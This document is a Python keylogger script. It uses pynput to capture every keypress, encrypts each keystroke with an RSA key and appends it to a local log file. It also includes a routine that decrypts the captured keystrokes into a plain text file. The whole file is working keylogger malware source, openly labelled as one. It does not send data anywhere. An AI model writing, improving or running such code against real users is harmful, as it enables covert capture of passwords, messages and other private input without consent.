from pynput.keyboard import Listener
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
import base64
import os

# Generate RSA keys if they don't exist
def generate_keys():
    if not os.path.exists('private.pem') or not os.path.exists('public.pem'):
        key = RSA.generate(2048)
        private_key = key.export_key()
        public_key = key.publickey().export_key()
        
        with open('private.pem', 'wb') as f:
            f.write(private_key)
        
        with open('public.pem', 'wb') as f:
            f.write(public_key)

# Encrypt data using RSA public key
def encrypt_data(data):
    with open('public.pem', 'rb') as f:
        public_key = RSA.import_key(f.read())
    cipher = PKCS1_OAEP.new(public_key)
    encrypted = cipher.encrypt(data.encode())
    return base64.b64encode(encrypted).decode()

# Decrypt data using RSA private key
def decrypt_data(encrypted_data):
    with open('private.pem', 'rb') as f:
        private_key = RSA.import_key(f.read())
    cipher = PKCS1_OAEP.new(private_key)
    decoded = base64.b64decode(encrypted_data.encode())
    return cipher.decrypt(decoded).decode()

def log_pressedkey(key):
    key = str(key).replace("'", "")
    if key == 'Key.space':
        key = ' '
    elif key == 'Key.enter':
        key = '\n'
    elif key == 'Key.backspace':
        key = '[BACKSPACE]'
    elif key.startswith('Key.'):
        key = f'[{key[4:]}]'
    
    # Encrypt the key before writing
    encrypted_key = encrypt_data(key)
    
    with open("EncryptedLog.db", 'a') as f:
        f.write(encrypted_key + '\n')

# Generate keys if they don't exist
generate_keys()

# Start the listener
with Listener(on_press=log_pressedkey) as listener:
    print("Keylogger started. Press Ctrl+C to stop.")
    try:
        listener.join()
    except KeyboardInterrupt:
        print("\nKeylogger stopped.")

# Decryption function to read the logs
def decrypt_logs():
    try:
        with open("EncryptedLog.db", 'r') as f:
            encrypted_logs = f.readlines()
        
        decrypted_text = ""
        for line in encrypted_logs:
            line = line.strip()
            if line:
                decrypted_text += decrypt_data(line)
        
        print("\nDecrypted Logs:")
        print(decrypted_text)
        
        # Save decrypted logs to file
        with open("DecryptedLogs.txt", 'w') as f:
            f.write(decrypted_text)
        print("\nDecrypted logs saved to DecryptedLogs.txt")
        
    except FileNotFoundError:
        print("No encrypted logs found.")

# Example of how to decrypt logs
if __name__ == "__main__":
    print("\nTo decrypt logs, run: decrypt_logs()")
    print("Private key is stored in private.pem - keep this secure!")